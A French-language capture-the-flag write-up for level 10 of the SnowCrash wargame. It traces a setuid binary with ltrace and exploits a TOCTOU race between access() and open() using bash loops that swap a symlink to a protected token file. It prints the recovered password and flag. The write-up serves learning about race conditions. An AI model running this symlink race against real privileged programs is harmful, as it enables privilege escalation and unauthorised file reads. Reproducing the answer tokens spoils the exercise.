# LEVEL 10

- On check ce qu'il y a: `ls -la`
```
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

- `ltrace ./level10` : \
```
__libc_start_main(0x80486d4, 1, 0xbffff6e4, 0x8048970, 0x80489e0 <unfinished ...>
printf("%s file host\n\tsends file to ho"..., "./level10"./level10 file host
	sends file to host if you have access to it
) = 65
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

Meme soucis que l'exo precedent, can't ltrace

- `./level10 token` :
```
./level10 file host
	sends file to host if you have access to it
```
- On essaye de lancer la commande avec le usage indique:
- `ltrace ./level10 /var/crash/test 0.0.0.0`
```
__libc_start_main(0x80486d4, 3, 0xbffff6d4, 0x8048970, 0x80489e0 <unfinished ...>
access("/var/crash/test", 4)                              = 0
printf("Connecting to %s:6969 .. ", "0.0.0.0")            = 30
fflush(0xb7fd1a20Connecting to 0.0.0.0:6969 .. )                                        = 0
socket(2, 1, 0)                                           = 3
inet_addr("0.0.0.0")                                      = NULL
htons(6969, 1, 0, 0, 0)                                   = 14619
connect(3, 0xbffff61c, 16, 0, 0)                          = 0
write(3, ".*( )*.\n", 8)                                  = 8
printf("Connected!\nSending file .. "Connected!
)                    = 27
fflush(0xb7fd1a20Sending file .. )                                        = 0
open("/var/crash/test", 0, 010)                           = 4
read(4, "yooooo\n", 4096)                                 = 7
write(3, "yooooo\n", 7)                                   = 7
puts("wrote file!"wrote file!
)                                       = 12
+++ exited (status 12) +++
```
On voit qu'au tout debut, le programme check les acces au fichier qu'on lui donne, si c'est ok, il fait pleins de trucs, puis il imprime le contenu du fichier.
On se dit que si entre le moment ou il check les permission et le moment ou il print le contenu, ya moyen de bidouiller quelque chose: \
On voudrait qu'il check les permissions d'un fichier auquel on a acces, mais qu'il affiche le contenu du token surlequel nous n'avons pas les droits... \
On va exploiter cette `race condition` avec deux boucles while:

```bash
while ((1))
> do
    > touch /var/crash/tmp
    > rm /var/crash/tmp
    > ln -s /home/user/level10/token /var/crash/tmp
    > rm /var/crash/tmp
> done
```

```bash
while ((1))
do ./level10 /var/crash/tmp 0.0.0.0
done
```

- WE GET `woupa2yuojeeaaed06riuj63c`
```bash
level10@SnowCrash:~$ su flag10
Password:
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

## 🔥 Password
`woupa2yuojeeaaed06riuj63c`